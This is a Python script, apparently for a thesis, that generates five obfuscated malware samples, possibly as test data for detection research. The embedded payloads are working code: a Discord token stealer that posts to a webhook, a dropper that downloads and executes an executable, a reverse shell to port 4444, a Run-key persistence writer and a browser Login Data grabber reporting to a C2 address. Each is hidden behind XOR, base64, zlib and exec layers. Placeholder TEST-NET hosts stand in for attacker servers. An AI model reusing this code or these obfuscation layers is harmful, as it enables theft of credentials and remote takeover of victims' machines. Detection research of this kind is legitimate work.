"""
Generates 5 realistic-looking obfuscated Python samples for thesis evaluation.
Payloads use fake/non-routable IPs (RFC 5737 TEST-NET: 192.0.2.x) and
placeholder credentials — not functional malware.
"""
import base64, zlib, os, textwrap
OUT = os.path.dirname(__file__)

def b64(s: str) -> bytes:
    return base64.b64encode(s.encode())

def b64z(s: str) -> bytes:
    return base64.b64encode(zlib.compress(s.encode()))

def xor_str(s: str, key: int) -> str:
    return ''.join((chr(ord(c) ^ key) for c in s))

def chr_array(s: str) -> str:
    return '[' + ','.join((str(ord(c)) for c in s)) + ']'

def hex_str(s: str) -> str:
    return s.encode().hex()

def write(name: str, content: str):
    path = os.path.join(OUT, name)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    print(f'  wrote {path}')
webhook_xored = xor_str('https://discord.com/api/webhooks/1122334455/PLACEHOLDER_WEBHOOK_TOKEN', 37)
payload_1 = f'''\nimport os, re, requests\n_d = lambda s: ''.join(chr(ord(c)^{37}) for c in s)\nWEBHOOK = _d("{webhook_xored}")\ndef _grab():\n    base = os.path.join(os.getenv('APPDATA') or '', 'discord', 'Local Storage', 'leveldb')\n    found = []\n    if os.path.isdir(base):\n        for f in os.listdir(base):\n            if not f.endswith(('.log', '.ldb')):\n                continue\n            try:\n                data = open(os.path.join(base, f), errors='ignore').read()\n                found += re.findall(r'[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}', data)\n            except Exception:\n                pass\n    return list(set(found))\ntoks = _grab()\nif toks:\n    requests.post(WEBHOOK, json={{"content": "\\n".join(toks)}})\n'''.strip()
shell_1 = b64(payload_1).decode()
sample_1 = f'import base64\nexec(base64.b64decode(b"{shell_1}").decode())\n'
write('sample_stealer.py', sample_1)
payload_2 = f"\nimport urllib.request, os, subprocess\nurl = '{'http://192.0.2.10/stage2.exe'}'\ndst = '{'C:\\Users\\Public\\svchost32.exe'}'\nurllib.request.urlretrieve(url, dst)\nsubprocess.Popen([dst], shell=False)\n".strip()
logic_b64z = b64z(payload_2).decode()
url_chars = chr_array('http://192.0.2.10/stage2.exe')
path_hex = hex_str('C:\\Users\\Public\\svchost32.exe')
sample_2 = f'''import base64, zlib\n\n_u = ''.join(map(chr, {url_chars}))\n_p = bytes.fromhex("{path_hex}").decode()\n\n_a = b"{logic_b64z}"\n_b = base64.b64decode(_a)\n_c = zlib.decompress(_b)\n_d = _c.decode()\n\nexec(_d)\n'''
write('sample_dropper.py', sample_2)
host_hex = hex_str('192.0.2.55')
inner_3 = f"\nimport socket, subprocess, os\nHOST = bytes.fromhex('{host_hex}').decode()\nPORT = {4444}\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\nwhile True:\n    cmd = s.recv(1024).decode(errors='ignore').strip()\n    if not cmd:\n        break\n    try:\n        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)\n    except Exception as e:\n        out = str(e).encode()\n    s.sendall(out + b'\\n>> ')\ns.close()\n".strip()
outer_3 = b64(inner_3).decode()
sample_3 = f'''_b64 = __import__('base64')\n_sys = __import__('sys')\n\n_enc = b"{outer_3}"\n_src = _b64.b64decode(_enc).decode()\nexec(_src)\n'''
write('sample_rat_loader.py', sample_3)
reg_xored = xor_str('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 19)
exe_bytes = list('C:\\Users\\Public\\updater.exe'.encode())
inner_4 = f'''\nimport winreg\n_rk = ''.join(chr(ord(c)^{19}) for c in "{reg_xored}")\n_ep = bytes({exe_bytes}).decode()\nkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _rk, 0, winreg.KEY_SET_VALUE)\nwinreg.SetValueEx(key, 'WindowsUpdater', 0, winreg.REG_SZ, _ep)\nwinreg.CloseKey(key)\n'''.strip()
compiled_4 = b64(f'compile({repr(inner_4)}, "<string>", "exec")').decode()
sample_4 = f'import base64\n_code = eval(base64.b64decode(b"{compiled_4}").decode())\nexec(_code)\n'
write('sample_persistence.py', sample_4)
core_5 = '\nimport os, json, shutil, requests\n\nC2 = "http://192.0.2.99/collect"\nPATHS = {\n    "Chrome":  os.path.join(os.getenv("LOCALAPPDATA") or "", "Google", "Chrome", "User Data", "Default", "Login Data"),\n    "Edge":    os.path.join(os.getenv("LOCALAPPDATA") or "", "Microsoft", "Edge",  "User Data", "Default", "Login Data"),\n}\n\ndef _exfil(data: dict):\n    try:\n        requests.post(C2, json=data, timeout=5)\n    except Exception:\n        pass\n\nfound = {}\nfor browser, path in PATHS.items():\n    tmp = os.path.join(os.getenv("TEMP") or ".", f"{browser}_ld")\n    if os.path.exists(path):\n        try:\n            shutil.copy2(path, tmp)\n            found[browser] = tmp\n        except Exception:\n            pass\n\n_exfil({"host": os.getenv("COMPUTERNAME"), "paths": list(found.keys())})\n'.strip()
layer3 = xor_str(core_5, 61)
layer2_src = f'''\n_dec = lambda s: ''.join(chr(ord(c)^{61}) for c in s)\n_raw = _dec("{layer3}")\nexec(_raw)\n'''.strip()
layer2_bytes = b64z(layer2_src).decode()
sample_5 = f'import base64, zlib\n\n_v1 = b"{layer2_bytes}"\n_v2 = base64.b64decode(_v1)\n_v3 = zlib.decompress(_v2)\n_v4 = _v3.decode()\nexec(_v4)\n'
write('sample_multilayer.py', sample_5)
print('\nDone. All 5 samples written.')